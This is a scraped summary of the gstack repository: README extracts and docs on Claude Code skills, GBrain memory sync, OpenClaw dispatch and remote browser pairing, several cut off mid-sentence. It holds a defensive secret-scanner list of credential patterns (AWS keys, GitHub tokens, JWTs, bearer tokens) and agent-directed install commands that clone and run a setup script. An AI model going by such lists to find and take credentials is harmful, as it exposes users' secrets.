# Missing Repo Summary Source: garrytan/gstack

- URL: https://github.com/garrytan/gstack
- Local Path: core-platform/data/brain_assets/repos/github_stars_missing/garrytan__gstack
- Clone Status: cloned
- Language: TypeScript
- Stars: 94845
- Topics: 
- Description: Use Garry Tan's exact Claude Code setup: 23 opinionated tools that serve as CEO, Designer, Eng Manager, Release Manager, Doc Engineer, and QA

## Extracted README / Docs / Examples



# FILE: README.md

# gstack

> "I don't think I've typed like a line of code probably since December, basically, which is an extremely large change." — [Andrej Karpathy](https://fortune.com/2026/03/21/andrej-karpathy-openai-cofounder-ai-agents-coding-state-of-psychosis-openclaw/), No Priors podcast, March 2026

When I heard Karpathy say this, I wanted to find out how. How does one person ship like a team of twenty? Peter Steinberger built [OpenClaw](https://github.com/openclaw/openclaw) — 247K GitHub stars — essentially solo with AI agents. The revolution is here. A single builder with the right tooling can move faster than a traditional team.

I'm [Garry Tan](https://x.com/garrytan), President & CEO of [Y Combinator](https://www.ycombinator.com/). I've worked with thousands of startups — Coinbase, Instacart, Rippling — when they were one or two people in a garage. Before YC, I was one of the first eng/PM/designers at Palantir, cofounded Posterous (sold to Twitter), and built Bookface, YC's internal social network.

**gstack is my answer.** I've been building products for twenty years, and right now I'm shipping more products than I ever have. In the last 60 days: 3 production services, 40+ shipped features, part-time, while running YC full-time. On logical code change — not raw LOC, which AI inflates — my 2026 run rate is **~810× my 2013 pace** (11,417 vs 14 logical lines/day). Year-to-date (through April 18), 2026 has already produced **240× the entire 2013 year**. Measured across 40 public + private `garrytan/*` repos including Bookface, after excluding one demo repo. AI wrote most of it. The point isn't who typed it, it's what shipped.

> The LOC critics aren't wrong that raw line counts inflate with AI. They are wrong that normalized-for-inflation, I'm less productive. I'm more productive, by a lot. Full methodology, caveats, and reproduction script: **[On the LOC Controversy](docs/ON_THE_LOC_CONTROVERSY.md)**.

**2026 — 1,237 contributions and counting:**

![GitHub contributions 2026 — 1,237 contributions, massive acceleration in Jan-Mar](docs/images/github-2026.png)

**2013 — when I built Bookface at YC (772 contributions):**

![GitHub contributions 2013 — 772 contributions building Bookface at YC](docs/images/github-2013.png)

Same person. Different era. The difference is the tooling.

**gstack is how I do it.** It turns Claude Code into a virtual engineering team — a CEO who rethinks the product, an eng manager who locks architecture, a designer who catches AI slop, a reviewer who finds production bugs, a QA lead who opens a real browser, a security officer who runs OWASP + STRIDE audits, and a release engineer who ships the PR. Twenty-three specialists and eight power tools, all slash commands, all Markdown, all free, MIT license.

This is my open source software factory. I use it every day. I'm sharing it because these tools should be available to everyone.

Fork it. Improve it. Make it yours. And if you want to hate on free open source software — you're welcome to, but I'd rather you just try it first.

**Who this is for:**
- **Founders and CEOs** — especially technical ones who still want to ship
- **First-time Claude Code users** — structured roles instead of a blank prompt
- **Tech leads and staff engineers** — rigorous review, QA, and release automation on every PR

## Quick start

1. Install gstack (30 seconds — see below)
2. Run `/office-hours` — describe what you're building
3. Run `/plan-ceo-review` on any feature idea
4. Run `/review` on any branch with changes
5. Run `/qa` on your staging URL
6. Stop there. You'll know if this is for you.

## Install — 30 seconds

**Requirements:** [Claude Code](https://docs.anthropic.com/en/docs/claude-code), [Git](https://git-scm.com/), [Bun](https://bun.sh/) v1.0+, [Node.js](https://nodejs.org/) (Windows only)

### Step 1: Install on your machine

Open Claude Code and paste this. Claude does the rest.

> Install gstack: run **`git clone --single-branch --depth 1 https://github.com/garrytan/gstack.git ~/.claude/skills/gstack && cd ~/.claude/skills/gstack && ./setup`** then add a "gstack" section to CLAUDE.md that says to use the /browse skill from gstack for all web browsing, never use mcp\_\_claude-in-chrome\_\_\* tools, and lists the available skills: /office-hours, /plan-ceo-review, /plan-eng-review, /plan-design-review, /design-consultation, /design-shotgun, /design-html, /review, /ship, /land-and-deploy, /canary, /benchmark, /browse, /connect-chrome, /qa, /qa-only, /design-review, /setup-browser-cookies, /setup-deploy, /setup-gbrain, /retro, /investigate, /document-release, /codex, /cso, /autoplan, /plan-devex-review, /devex-review, /careful, /freeze, /guard, /unfreeze, /gstack-upgrade, /learn. Then ask the user if they also want to add gstack to the current project so teammates get it.

### Step 2: Team mode — auto-update for shared repos (recommended)

From inside your repo, paste this. Switches you to team mode, bootstraps the repo so teammates get gstack automatically, and commits the change:

```bash
(cd ~/.claude/skills/gstack && ./setup --team) && ~/.claude/skills/gstack/bin/gstack-team-init required && git add .claude/ CLAUDE.md && git commit -m "require gstack for AI-assisted work"
```

No vendored files in your repo, no version drift, no manual upgrades. Every Claude Code session starts with a fast auto-update check (throttled to once/hour, network-failure-safe, completely silent).

Swap `required` for `optional` if you'd rather nudge teammates than block them.

### OpenClaw

OpenClaw spawns Claude Code sessions via ACP, so every gstack skill just works
when Claude Code has gstack installed. Paste this to your OpenClaw agent:

> Install gstack: run `git clone --single-branch --depth 1 https://github.com/garrytan/gstack.git ~/.claude/skills/gstack && cd ~/.claude/skills/gstack && ./setup` to install gstack for Claude Code. Then add a "Coding Tasks" section to AGENTS.md that says: when spawning Claude Code sessions for coding work, tell the session to use gstack skills. Include these examples — security audit: "Load gstack. Run /cso", code review: "Load gstack. Run /review", QA test a URL: "Load gstack. Run /qa https://...", build a feature end-to-end: "Load gstack. Run /autoplan, implement the plan, then run /ship", plan before building: "Load gstack. Run /office-hours then /autoplan. Save the plan, don't implement."

**After setup, just talk to your OpenClaw agent naturally:**

| You say | What happens |
|---------|-------------|
| "Fix the typo in README" | Simple — Claude Code session, no gstack needed |
| "Run a security audit on this repo" | Spawns Claude Code with `Run /cso` |
| "Build me a notifications feature" | Spawns Claude Code with /autoplan → implement → /ship |
| "Help me plan the v2 API redesign" | Spawns Claude Code with /office-hours → /autoplan, saves plan |

See [docs/OPENCLAW.md](docs/OPENCLAW.md) for advanced dispatch routing and
the gstack-lite/gstack-full prompt templates.

### Native OpenClaw Skills (via ClawHub)

Four methodology skills that work directly in your OpenClaw agent, no Claude Code
session needed. Install from ClawHub:

```
clawhub install gstack-openclaw-office-hours gstack-openclaw-ceo-review gstack-openclaw-investigate gstack-openclaw-retro
```

| Skill | What it does |
|-------|-------------|
| `gstack-openclaw-office-hours` | Product interrogation with 6 forcing questions |
| `gstack-openclaw-ceo-review` | Strategic challenge with 4 scope modes |
| `gstack-openclaw-investigate` | Root cause debugging methodology |
| `gstack-openclaw-retro` | Weekly engineering retrospective |

These are conversational skills. Your OpenClaw agent runs them directly via chat.

### Other AI Agents

gstack works on 10 AI coding agents, not just Claude. Setup auto-detects which
agents you have installed:

```bash
git clone --single-branch --depth 1 https://github.com/garrytan/gstack.git ~/gstack
cd ~/gstack && ./setup
```

Or target a specific agent with `./setup --host <name>`:

| Agent | Flag | Skills install to |
|-------|------|-------------------|
| OpenAI Codex CLI | `--host codex` | `~/.codex/skills/gstack-*/` |
| OpenCode | `--host opencode` | `~/.config/opencode/skills/gstack-*/` |
| Cursor | `--host cursor` | `~/.cursor/skills/gstack-*/` |
| Factory Droid | `--host factory` | `~/.factory/skills/gstack-*/` |
| Slate | `--host slate` | `~/.slate/skills/gstack-*/` |
| Kiro | `--host kiro` | `~/.kiro/skills/gstack-*/` |
| Hermes | `--host hermes` | `~/.hermes/skills/gstack-*/` |
| GBrain (mod) | `--host gbrain` | `~/.gbrain/skills/gstack-*/` |

**Want to add support for another agent?** See [docs/ADDING_A_HOST.md](docs/ADDING_A_HOST.md).
It's one TypeScript config file, zero code changes.

## See it work

```
You:    I want to build a daily briefing app for my calendar.
You:    /office-hours
Claude: [asks about the pain — specific examples, not hypotheticals]

You:    Multiple Google calendars, events with stale info, wrong locations.
        Prep takes forever and the results aren't good enough...

Claude: I'm going to push back on the framing. You said "daily briefing
        app." But what you actually described is a personal chief of
        staff AI.
        [extracts 5 capabilities you didn't realize you were describing]
        [challenges 4 premises — you agree, disagree, or adjust]
        [generates 3 implementation approaches with effort estimates]
        RECOMMENDATION: Ship the narrowest wedge tomorrow, learn from
        real usage. The full vision is a 3-month project — start with
        the daily briefing that actually works.
        [writes design doc → feeds into downstream skills automatically]

You:    /plan-ceo-review
        [reads the design doc, challenges scope, runs 10-section review]

You:    /plan-eng-review
        [ASCII diagrams for data flow, state machines, error paths]
        [test matrix, failure modes, security concerns]

You:    Approve plan. Exit plan mode.
        [writes 2,400 lines acros

# FILE: docs/gbrain-sync-errors.md

# gbrain-sync error lookup

Every error message `gstack-brain-*` can print, with problem, cause, and fix.

Search this file by the prefix after `BRAIN_SYNC:` or by the binary name in
the command output.

---

## `BRAIN_SYNC: brain repo detected: <url>`

**Problem.** You're on a machine that has `~/.gstack-brain-remote.txt` (copied
from another machine) but no local git repo at `~/.gstack/.git`.

**Cause.** You've set up GBrain sync elsewhere and your gstack hasn't been
restored on this machine yet.

**Fix.**
```bash
gstack-brain-restore
```
This pulls the repo into `~/.gstack/` and re-registers merge drivers.

If you don't want to restore here, dismiss the hint with:
```bash
gstack-config set gbrain_sync_mode_prompted true
```

---

## `BRAIN_SYNC: blocked: <pattern-family>:<snippet>`

**Problem.** Sync stopped because the secret scanner detected credential-shaped
content in a staged file. The queue is preserved; nothing was pushed.

**Cause.** One of the pre-commit secret patterns matched the file contents —
likely an AWS key, GitHub token, OpenAI key, PEM block, JWT, or bearer token
embedded in JSON.

**Fix (three options).**

1. **If it's a real secret**: edit the offending file to remove the secret,
   then re-run any skill to retry sync.

2. **If the pattern is a false positive** (e.g., your learning contains a
   GitHub token pattern in an example string that you *want* to publish):
   ```bash
   gstack-brain-sync --skip-file <path>
   ```
   This permanently excludes the path from future syncs.

3. **If you want to abandon this sync batch entirely** (start fresh):
   ```bash
   gstack-brain-sync --drop-queue --yes
   ```
   This clears the queue without committing. Future writes will re-populate
   it normally.

---

## `BRAIN_SYNC: push failed: auth.`

**Problem.** Git push was rejected because your auth with the remote expired
or is missing.

**Cause.** The remote is unreachable with current credentials.

**Fix.** Refresh auth based on your remote:

- **GitHub**: `gh auth status` (then `gh auth refresh` if needed)
- **GitLab**: `glab auth status`
- **Other**: `git remote -v` + check SSH keys or credential helper

After fixing auth, run any skill to retry sync automatically.

---

## `BRAIN_SYNC: push failed: <first-line-of-error>`

**Problem.** Push failed for a reason other than auth. The first line of
git's error appears after the colon.

**Cause.** Could be network issue, rejected push (remote ahead), server 500,
or repo access revoked.

**Fix.** Look at `~/.gstack/.brain-sync-status.json` for more detail, or run:
```bash
cd ~/.gstack && git status && git push origin HEAD
```
to see git's full error. The queue is cleared after any push attempt, but
your local commit still exists — the next skill run will retry the push.

---

## `gstack-brain-init: ~/.gstack/.git is already a git repo pointing at <url>`

**Problem.** You tried to init with a remote URL that doesn't match the
existing one.

**Cause.** You already ran `gstack-brain-init` with a different remote.

**Fix.** Either:

- Use the existing remote: run `gstack-brain-init` without `--remote`, or
  with the matching URL.
- Switch remotes: `gstack-brain-uninstall` first, then re-init with the new
  URL. This does not delete your data.

---

## `Remote not reachable: <url>`

**Problem.** Init couldn't reach the git remote to verify connectivity.

**Cause.** Wrong URL, missing auth, network issue.

**Fix.** Test manually:
```bash
git ls-remote <url>
```
If that fails, check:
- URL spelling
- GitHub: `gh auth status`
- GitLab: `glab auth status`
- Private network / VPN / DNS

---

## `gstack-brain-init: failed to create or find '<name>'`

**Problem.** Auto-repo-creation via `gh repo create` failed and the repo
isn't discoverable via `gh repo view` either.

**Cause.** `gh` is unauthenticated, a repo with that name already exists
owned by someone else, or your GitHub account hit a quota.

**Fix.**
```bash
gh auth status
```
If unauth'd, run `gh auth login`. If the repo name collides, pass a different
name:
```bash
gstack-brain-init --remote git@github.com:YOURUSER/custom-name.git
```

---

## `gstack-brain-restore: ~/.gstack/.git already points at <url>`

**Problem.** You tried to restore from a URL that doesn't match the existing
git config.

**Cause.** Stale `.git` from a previous init with a different remote.

**Fix.** `gstack-brain-uninstall`, then re-run `gstack-brain-restore <url>`.

---

## `gstack-brain-restore: ~/.gstack/ has existing allowlisted files that would be clobbered`

**Problem.** You're trying to restore, but `~/.gstack/` already contains
learnings or plans that would be overwritten.

**Cause.** Either (a) this machine has accumulated state from a pre-sync
gstack session, or (b) a previous failed restore left partial state.

**Fix (three options).**

1. **If this machine's state should become the new truth**: run
   `gstack-brain-init` instead of restore — this creates a brand-new brain
   repo from this machine's state.

2. **If you want to adopt the remote and discard this machine's state**:
   back up `~/.gstack/projects/` first, then remove the offending files and
   re-run restore.

3. **If you want to merge**: there's no automatic merge for this. Manually
   copy learnings from `~/.gstack/` into your running gstack on a machine
   with sync already on, then restore here.

---

## `gstack-brain-restore: <url> does not look like a gstack-brain repo`

**Problem.** The clone succeeded but the repo is missing `.brain-allowlist`
and `.gitattributes`.

**Cause.** You pointed restore at a random git repo, or someone deleted the
canonical config files from the brain repo.

**Fix.** Verify the URL. If it's correct, run `gstack-brain-init --remote
<url>` to re-seed the canonical config.

---

## Nothing is syncing but I expect it to

**Not an error, but a common gotcha.** Check in order:

1. `gstack-brain-sync --status` — is mode `off`?
2. `~/.gstack/.git` exists?
3. `gstack-config get gbrain_sync_mode` — should

# FILE: docs/gbrain-sync.md

# Cross-machine memory with GBrain sync

gstack writes a lot of useful state to `~/.gstack/` — learnings, retros, CEO
plans, design docs, developer profile. By default, all of that dies when you
switch laptops. **GBrain sync** pushes a curated subset to a private git
repo so your memory follows you across machines and becomes indexable by
GBrain.

## What you get

- Work on machine A, pick up seamlessly on machine B.
- Your learnings, plans, and designs are visible in GBrain (if you use it).
- A clean off-ramp (`gstack-brain-uninstall`) that never touches your data.
- No daemon, no system service, no background process.

## What does NOT leave your machine

By design, these stay local even when sync is on:

- Credentials: `.auth.json`, `auth-token.json`, `sidebar-sessions/`,
  `security/device-salt`, consumer tokens in `config.yaml`
- Machine-specific state: Chromium profiles, ONNX model weights,
  caches, eval-cache, CDP-profile, one-time prompt markers
  (`.welcome-seen`, `.telemetry-prompted`, `.vendoring-warned-*`, etc.)
- Question-preferences: per-machine UX preferences
  (`question-preferences.json`, `question-log.jsonl`, `question-events.jsonl`).

The exact allowlist lives in `~/.gstack/.brain-allowlist`. The CLI manages
it; you can append your own entries below the marker line.

## First-run setup (30–90 seconds)

```bash
gstack-brain-init
```

The command:

1. Turns `~/.gstack/` into a git repo.
2. Asks for a remote URL (default: `gh repo create --private
   gstack-brain-$USER`). Any git remote works — GitHub, GitLab, Gitea,
   self-hosted.
3. Pushes an initial commit with just the config.
4. Writes `~/.gstack-brain-remote.txt` (URL-only, no secrets —
   safe to copy to another machine).
5. Wires the gstack-brain repo into your local gbrain as a federated
   source (via `gbrain sources add` + `git worktree`) so `gbrain search`
   can index your synced learnings, plans, and designs. Implementation
   lives in `bin/gstack-gbrain-source-wireup`. The old
   `gstack-brain-reader add --ingest-url ...` HTTP path was removed in
   v1.15.1.0 — it depended on a `/ingest-repo` endpoint gbrain never
   shipped.

After init, the **next skill you run** will ask you ONE question about
privacy mode:

- **Everything allowlisted (recommended)**: learnings, reviews, plans,
  designs, retros, timelines, and developer profile all sync.
- **Only artifacts**: plans, designs, retros, learnings — skip
  behavioral data (timelines, developer profile).
- **Decline**: keep everything local. You can turn sync on later with
  `gstack-config set gbrain_sync_mode full`.

Your answer is persisted. You won't be asked again.

## Cross-machine workflow

On machine A: run `gstack-brain-init` once. That's it — every skill
invocation now drains the sync queue at its start and end boundaries
(~200–800 ms network pause per skill).

On machine B:

1. Copy `~/.gstack-brain-remote.txt` from machine A to machine B
   (password manager, dotfile repo, USB stick — your call).
2. Run any gstack skill. The preamble sees the URL file and prints:
   ```
   BRAIN_SYNC: brain repo detected: <url>
   BRAIN_SYNC: run 'gstack-brain-restore' to pull your cross-machine memory
   ```
3. Run `gstack-brain-restore`. That clones the repo, rehydrates your
   learnings/plans/retros, and re-registers the git merge drivers.
4. Re-enter consumer tokens (they're machine-local and NOT synced —
   `gstack-config set gbrain_token <your-token>`).
5. Next skill: your yesterday-on-machine-A learning surfaces. That's the
   magical moment.

## Status, health, and queue depth

```bash
gstack-brain-sync --status
```

Shows: last successful push, pending queue depth, any sync blocks, and the
current privacy mode.

Every skill run prints a `BRAIN_SYNC:` line near the top of the preamble
output. Scan it for problems.

## Privacy modes in detail

| Mode | What syncs |
|------|------------|
| `off` | Nothing (default). |
| `artifacts-only` | Plans, designs, retros, learnings, reviews. Skips timelines + developer-profile. |
| `full` | Everything in the allowlist, including behavioral state. |

Change anytime with:
```bash
gstack-config set gbrain_sync_mode full
gstack-config set gbrain_sync_mode off
```

## Secret protection

Every commit is scanned for credential-shaped content before it leaves
your machine. Blocked patterns include:

- AWS access keys (`AKIA…`)
- GitHub tokens (`ghp_`, `gho_`, `ghu_`, `ghs_`, `ghr_`, `github_pat_`)
- OpenAI keys (`sk-…`)
- PEM blocks (`-----BEGIN …-----`)
- JWTs (`eyJ…`)
- Bearer tokens in JSON (`"authorization": "…"`, `"api_key": "…"`, etc.)

If a scan hits, sync stops, the queue is preserved, and your preamble
prints:

```
BRAIN_SYNC: blocked: <pattern-family>:<snippet>
```

To remediate:

1. Review the offending file.
2. If the match is a false positive on content you explicitly want to
   sync, run `gstack-brain-sync --skip-file <path>` to permanently
   exclude that path.
3. Otherwise, edit the file to remove the secret and re-run any skill.

There's a defense-in-depth hook at `~/.gstack/.git/hooks/pre-commit` that
runs the same scan if you manually `git commit` against the repo.

## Two-machine conflicts

If you write on machine A and machine B the same day, both will push
append commits. Git's default would conflict at the file tail, but the
`.jsonl` and markdown files are registered with custom merge drivers:

- JSONL files use a sort-and-dedup driver that orders appends by ISO
  timestamp (falls back to SHA-256 hash of each line for determinism).
- Markdown artifacts (retros, plans, designs) use a union merge driver
  that concatenates both sides.

You shouldn't see conflict prompts. If you do (a real semantic conflict,
like two machines editing the same plan), git will stop and prompt.

## Cross-machine pull cadence

The preamble runs `git fetch` + `git merge --ff-only` once per 24 hours
(cached via `~/.gstack/.brain-last-pull`). You don't need to think about
this — it happens automatically at the first skill invoca

# FILE: docs/OPENCLAW.md

# gstack x OpenClaw Integration

gstack integrates with OpenClaw as a methodology source, not a ported codebase.
OpenClaw's ACP runtime spawns Claude Code sessions natively. gstack provides the
planning discipline and methodology that makes those sessions better.

This is a lightweight protocol encoded as prompt text. No daemon. No JSON-RPC.
No compatibility matrices. The prompt is the bridge.

## Architecture

```
  OpenClaw                               gstack repo
  ─────────────────────                    ──────────────
  Orchestrator: messaging,                 Source of truth for
  calendar, memory, EA                     methodology + planning
       │                                        │
       ├── Native skills (conversational)       ├── Generates native skills
       │   office-hours, ceo-review,            │   via gen-skill-docs pipeline
       │   investigate, retro                   │
       │                                        ├── Generates gstack-lite
       ├── sessions_spawn(runtime: "acp")       │   (planning discipline)
       │       │                                │
       │       └── Claude Code                  ├── Generates gstack-full
       │           └── gstack installed at      │   (complete pipeline)
       │               ~/.claude/skills/gstack  │
       │                                        └── docs/OPENCLAW.md (this file)
       └── Dispatch routing (AGENTS.md)
```

## Dispatch Routing

OpenClaw decides at spawn time which tier of gstack support to use:

| Tier | When | Prompt prefix |
|------|------|---------------|
| **Simple** | One-file edits, typos, config changes | No gstack context injected |
| **Medium** | Multi-file features, refactors | gstack-lite CLAUDE.md appended |
| **Heavy** | Specific gstack skill needed | "Load gstack. Run /X" |
| **Full** | Complete features, objectives, projects | gstack-full pipeline appended |
| **Plan** | "Help me plan a Claude Code project" | gstack-plan pipeline appended |

### Decision heuristic

- Can it be done in <10 lines of code? -> **Simple**
- Does it touch multiple files but the approach is obvious? -> **Medium**
- Does the user name a specific skill (/cso, /review, /qa)? -> **Heavy**
- Is it a feature, project, or objective (not a task)? -> **Full**
- Does the user want to PLAN something for Claude Code without implementing yet? -> **Plan**

### Dispatch routing guide (for AGENTS.md)

The complete ready-to-paste section lives in `openclaw/agents-gstack-section.md`.
Copy it into your OpenClaw AGENTS.md.

Key behavioral rules (these go ABOVE the dispatch tiers):

1. **Always spawn, never redirect.** When the user asks to use ANY gstack skill,
   ALWAYS spawn a Claude Code session. Never tell the user to open Claude Code.
2. **Resolve the repo.** If the user names a repo, set the working directory. If
   unknown, ask which repo.
3. **Autoplan runs end-to-end.** Spawn, let it run the full pipeline, report back
   in chat. User should never have to leave Telegram.

### CLAUDE.md collision handling

When spawning Claude Code in a repo that already has a CLAUDE.md, APPEND
gstack-lite/full as a new section. Do not replace the repo's existing instructions.

## What gstack generates for OpenClaw

All artifacts live in the `openclaw/` directory and are generated by
`bun run gen:skill-docs --host openclaw`:

### gstack-lite (Medium tier)
`openclaw/gstack-lite-CLAUDE.md` — ~15 lines of planning discipline:
1. Read every file before modifying
2. Write a 5-line plan: what, why, which files, test case, risk
3. Resolve ambiguity using decision principles
4. Self-review before reporting done
5. Completion report: what shipped, decisions made, anything uncertain

A/B tested: 2x time, meaningfully better output.

### gstack-full (Full tier)
`openclaw/gstack-full-CLAUDE.md` — chains existing gstack skills:
1. Read CLAUDE.md and understand the project
2. Run /autoplan (CEO + eng + design review)
3. Implement the approved plan
4. Run /ship to create a PR
5. Report back with PR URL and decisions

### gstack-plan (Plan tier)
`openclaw/gstack-plan-CLAUDE.md` — full review gauntlet, no implementation:
1. Run /office-hours to produce a design doc
2. Run /autoplan (CEO + eng + design + DX reviews + codex adversarial)
3. Save the reviewed plan to `plans/<project-slug>-plan-<date>.md`
4. Report back: plan path, summary, key decisions, recommended next step

The orchestrator persists the plan link to its own memory store (brain repo,
knowledge base, or whatever is configured in AGENTS.md). When the user is
ready to build, spawn a FULL session that references the saved plan.

### Native methodology skills
Published to ClawHub. Install with `clawhub install`:
- `gstack-openclaw-office-hours` — Product interrogation (6 forcing questions)
- `gstack-openclaw-ceo-review` — Strategic challenge (10-section review, 4 modes)
- `gstack-openclaw-investigate` — Operational debugging (4-phase methodology)
- `gstack-openclaw-retro` — Operational retrospective (weekly review)

Source lives in `openclaw/skills/` in the gstack repo. These are hand-crafted
adaptations of the gstack methodology for OpenClaw's conversational context.
No gstack infrastructure (no browse, no telemetry, no preamble).

## Spawned session detection

When Claude Code runs inside a session spawned by OpenClaw, the `OPENCLAW_SESSION`
environment variable should be set. gstack detects this and adjusts:
- Skips interactive prompts (auto-chooses recommended options)
- Skips upgrade checks and telemetry prompts
- Focuses on task completion and prose reporting

Set the env var in sessions_spawn: `env: { OPENCLAW_SESSION: "1" }`

## Installation

For OpenClaw users: tell your OpenClaw agent "install gstack for openclaw."

The agent should:
1. Install gstack-lite CLAUDE.md into its coding session templates
2. Install the 4 native methodology skills
3. Add dispatch routing to AGENTS.md
4. Verify with a test spawn

For gstack developers: `./setup --host openclaw` outputs this 

# FILE: docs/REMOTE_BROWSER_ACCESS.md

# Remote Browser Access — How to Pair With a GStack Browser

A GStack Browser server can be shared with any AI agent that can make HTTP requests.
The agent gets scoped access to a real Chromium browser: navigate pages, read content,
click elements, fill forms, take screenshots. Each agent gets its own tab.

This document is the reference for remote agents. The quick-start instructions are
generated by `$B pair-agent` with the actual credentials baked in.

## Architecture

```
Your Machine                          Remote Agent
─────────────                         ────────────
GStack Browser Server                 Any AI agent
  ├── Chromium (Playwright)           (OpenClaw, Hermes, Codex, etc.)
  ├── Local listener  127.0.0.1:LOCAL         │
  │    (bootstrap, CLI, sidebar, cookies)      │
  ├── Tunnel listener 127.0.0.1:TUNNEL ◄───────┤
  │    (pair-agent only: /connect, /command,   │
  │     /sidebar-chat — locked allowlist)      │
  ├── ngrok tunnel (forwards tunnel port only) │
  │     https://xxx.ngrok.dev ─────────────────┘
  └── Token Registry
        ├── Root token (local listener only)
        ├── Setup keys (5 min, one-time)
        ├── Session tokens (24h, scoped)
        └── SSE session cookies (30 min, stream-scope)
```

### Dual-listener architecture (v1.6.0.0)

The daemon binds two HTTP sockets. The **local listener** serves the full command surface to 127.0.0.1 only and is never forwarded. The **tunnel listener** is bound lazily on `/tunnel/start` (and torn down on `/tunnel/stop`) with a locked path allowlist. ngrok forwards only the tunnel port.

A caller who stumbles onto your ngrok URL cannot reach `/health`, `/cookie-picker`, `/inspector/*`, or `/welcome` — those paths don't exist on that TCP socket. Root tokens sent over the tunnel get 403. The tunnel listener accepts only `/connect`, `/command` (with a scoped token + the 26-command browser-driving allowlist), and `/sidebar-chat`.

See [ARCHITECTURE.md](../ARCHITECTURE.md#dual-listener-tunnel-architecture-v1600) for the full endpoint table.

## Connection Flow

1. **User runs** `$B pair-agent` (or `/pair-agent` in Claude Code)
2. **Server creates** a one-time setup key (expires in 5 minutes)
3. **User copies** the instruction block into the other agent's chat
4. **Remote agent runs** `POST /connect` with the setup key
5. **Server returns** a scoped session token (24h default)
6. **Remote agent creates** its own tab via `POST /command` with `newtab`
7. **Remote agent browses** using `POST /command` with its session token + tabId

## API Reference

### Authentication

All command endpoints require a Bearer token:

```
Authorization: Bearer gsk_sess_...
```

`/connect` is unauthenticated (rate-limited) — it's how a remote agent exchanges a setup key for a scoped session token. `/health` is unauthenticated on the local listener (bootstrap) but does NOT exist on the tunnel listener (404).

SSE endpoints (`/activity/stream`, `/inspector/events`) accept either a Bearer token or the HttpOnly `gstack_sse` cookie (minted via `POST /sse-session`, 30-minute TTL, stream-scope only — cannot be used against `/command`). As of v1.6.0.0 the `?token=<ROOT>` query-string auth is no longer accepted.

### Endpoints

#### POST /connect
Exchange a setup key for a session token. No auth required. Rate-limited to 300/minute (flood defense — setup keys are 24 random bytes, unbruteforceable).

```json
Request:  {"setup_key": "gsk_setup_..."}
Response: {"token": "gsk_sess_...", "expires": "ISO8601", "scopes": ["read","write"], "agent": "agent-name"}
```

#### POST /command
Send a browser command. Requires Bearer auth.

```json
Request:  {"command": "goto", "args": ["https://example.com"], "tabId": 1}
Response: (plain text result of the command)
```

#### GET /health
Server status. No auth required. Returns status, tabs, mode, uptime.

### Commands

#### Navigation
| Command | Args | Description |
|---------|------|-------------|
| `goto` | `["URL"]` | Navigate to a URL |
| `back` | `[]` | Go back |
| `forward` | `[]` | Go forward |
| `reload` | `[]` | Reload page |

#### Reading Content
| Command | Args | Description |
|---------|------|-------------|
| `snapshot` | `["-i"]` | Interactive snapshot with @ref labels (most useful) |
| `text` | `[]` | Full page text |
| `html` | `["selector?"]` | HTML of element or full page |
| `links` | `[]` | All links on page |
| `screenshot` | `["/tmp/s.png"]` | Take a screenshot |
| `url` | `[]` | Current URL |

#### Interaction
| Command | Args | Description |
|---------|------|-------------|
| `click` | `["@e3"]` | Click an element (use @ref from snapshot) |
| `fill` | `["@e5", "text"]` | Fill a form field |
| `select` | `["@e7", "option"]` | Select dropdown value |
| `type` | `["text"]` | Type text (keyboard) |
| `press` | `["Enter"]` | Press a key |
| `scroll` | `["down"]` | Scroll the page |

#### Tabs
| Command | Args | Description |
|---------|------|-------------|
| `newtab` | `["URL?"]` | Create a new tab (required before writing) |
| `tabs` | `[]` | List all tabs |
| `closetab` | `["id?"]` | Close a tab |

## The Snapshot → @ref Pattern

This is the most powerful browsing pattern. Instead of writing CSS selectors:

1. Run `snapshot -i` to get an interactive snapshot with labeled elements
2. The snapshot returns text like:
   ```
   [Page Title]
   @e1 [link] "Home"
   @e2 [button] "Sign In"
   @e3 [input] "Search..."
   ```
3. Use the `@e` refs directly in commands: `click @e2`, `fill @e3 "search query"`

This is how the snapshot system works, and it's much more reliable than guessing
CSS selectors. Always `snapshot -i` first, then use the refs.

## Scopes

| Scope | What it allows |
|-------|---------------|
| `read` | snapshot, text, html, links, screenshot, url, tabs, console, etc. |
| `write` | goto, click, fill, scroll, newtab, closetab, etc. |
| `admin` | eval, js, cookies, storage, cookie-import, useragent, etc. |
| `meta` | tab, diff, frame, responsive, watch |

Default tokens get `read` + `

# FILE: docs/domain-skills.md

# Domain Skills

Per-site notes the agent writes for itself. Compounds across sessions: once an
agent figures out something non-obvious about a website, it saves a skill, and
future sessions on that host get the note injected into their prompt context.

This is gstack's borrow from [browser-use/browser-harness](https://github.com/browser-use/browser-harness).
gstack copies the per-site-notes pattern, NOT the self-modifying-runtime
pattern. Skills are markdown text loaded into prompts; they are not executable
code.

## How agents use it

```bash
# Agent wrote down what it learned about a site after a successful task.
# The host is taken from the active tab automatically (no agent argument).
echo "# LinkedIn Apply Button

The Apply button on /jobs/view pages is inside an iframe with a class
matching 'jobs-apply-button-iframe'. Use \$B frame --url 'apply' first,
then snapshot." | $B domain-skill save

# See what's saved
$B domain-skill list

# Read the body of a specific host's skill
$B domain-skill show linkedin.com

# Edit interactively in $EDITOR
$B domain-skill edit linkedin.com

# Promote an active per-project skill to global (cross-project)
$B domain-skill promote-to-global linkedin.com

# Roll back a recent edit
$B domain-skill rollback linkedin.com

# Delete (tombstone — recoverable via rollback)
$B domain-skill rm linkedin.com
```

## State machine

```
  ┌──────────────┐  3 successful uses        ┌────────┐  promote-to-global   ┌────────┐
  │ quarantined  │ ─────────────────────▶  │ active │ ──────────────────▶  │ global │
  │ (per-project)│  (no classifier flags)   │(project)│  (manual command)    │        │
  └──────────────┘                          └────────┘                      └────────┘
         ▲                                       │
         │  classifier flag during use           │  rollback (version log)
         └───────────────────────────────────────┘
```

A new save lands as **quarantined** and does NOT auto-fire in prompts. After 3
uses on this host without the L4 ML classifier flagging the skill content, the
skill auto-promotes to **active** in the project. Active skills fire on every
new sidebar-agent session for that hostname.

To make a skill fire across projects (for example, "I want my LinkedIn skill
on every gstack project I work on"), explicitly run
`$B domain-skill promote-to-global <host>`. This is opt-in by design (Codex T4
outside-voice review): blanket cross-project compounding leaks context across
unrelated work.

## Storage

Skills live in two places:

- **Per-project**: `~/.gstack/projects/<slug>/learnings.jsonl` — same JSONL
  file the `/learn` skill uses. Domain skills are `type:"domain"` rows.
- **Global**: `~/.gstack/global-domain-skills.jsonl` — only `state:"global"`
  rows.

Both files are append-only JSONL. Tombstones for deletes; an idle compactor
rewrites files periodically. Tolerant parser drops partial trailing lines on
read so a crash mid-write doesn't poison subsequent reads.

## Security model

